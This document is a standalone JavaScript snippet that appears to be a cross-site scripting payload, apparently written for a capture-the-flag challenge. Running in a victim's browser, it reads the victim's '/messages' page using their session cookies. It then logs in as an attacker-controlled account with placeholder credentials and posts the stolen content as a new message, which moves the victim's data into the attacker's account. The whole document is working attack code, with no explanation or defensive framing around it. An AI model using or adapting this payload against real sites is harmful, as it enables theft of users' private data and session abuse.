(async () => {
  const U = "ATTACKER_USER1212";
  const P = "ATTACKER_PASS1212";
  let payload = "";
  try {
    const r = await fetch("/messages", { cache: "no-store", credentials: "include" });
    payload = await r.text();
  } catch (e) {
    payload = "ERR_FETCH:" + e;
  }
  try {
    await fetch("/auth", {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({ action: "login", username: U, password: P }),
    });
  } catch (e) {
    // ignore
  }
  try {
    await fetch("/create_msg", {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message: payload.slice(0, 4000) }),
    });
  } catch (e) {
    // last-ditch: try once more with the error text itself
    try {
      await fetch("/create_msg", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: "ERR_STORE:" + String(e) }),
      });
    } catch (_) {}
  }
})();
